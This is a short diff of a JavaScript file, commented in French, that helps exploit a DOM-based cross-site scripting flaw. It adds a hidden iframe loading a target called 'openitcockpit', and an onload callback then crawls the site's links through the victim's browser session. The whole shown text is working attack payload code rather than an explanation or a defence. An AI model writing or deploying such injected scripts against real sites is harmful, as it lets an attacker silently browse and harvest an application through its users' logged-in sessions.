@@ -1,6 +1,17 @@
 // Script qui va avec la base de données et l'API permettant de faciliter l'exploitation d'une XSS DOM-based
 // Le script charge la page d'accueil du site puis navigue dans tous les liens qu'elle contient
 
+
+var iframe = document.createElement('iframe');
+iframe.setAttribute("style","display:none")
+iframe.onload = actions;
+iframe.width = "100%"
+iframe.height = "100%"
+iframe.src = "https://openitcockpit"
+
+body = document.getElementsByTagName('body')[0];
+body.appendChild(iframe)
+
 function actions() {
     setTimeout(function() {
         getContent()
